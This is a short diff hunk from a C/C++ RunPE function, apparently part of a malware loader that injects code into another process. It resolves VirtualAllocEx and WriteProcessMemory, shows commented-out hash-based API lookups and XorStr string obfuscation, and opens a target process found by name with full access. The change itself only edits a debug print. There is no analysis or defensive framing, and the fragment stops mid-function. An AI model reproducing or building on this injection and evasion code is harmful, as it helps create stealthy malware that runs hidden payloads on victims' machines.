@@ -315,9 +315,9 @@ int RunPE(BYTE* image, wchar_t* path, DWORD imageSize, wchar_t* args = (wchar_t*
 	*(DWORD_PTR*)&pVirtualAllocEx = (DWORD_PTR)VirtualAllocEx;//get_proc_address(hKernel32, 0x0dd78764);
 	*(DWORD_PTR*)&pWriteProcessMemory = (DWORD_PTR)WriteProcessMemory;//get_proc_address(hKernel32, 0x6659de75);
 
-#ifdef INJECT_TO_EXISTING_PROCESS 
-	DWORD pid = FindProcByName(procname);
-	printfdbg(XorStr("Pid %x (%s)\n"), pid, procname);
+#ifdef INJECT_TO_EXISTING_PROCESS  
+	DWORD pid = FindProcByName(procname); 
+	printfdbg("pid %x\n",pid);
 	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
 #else
 	PROCESS_INFORMATION PI;
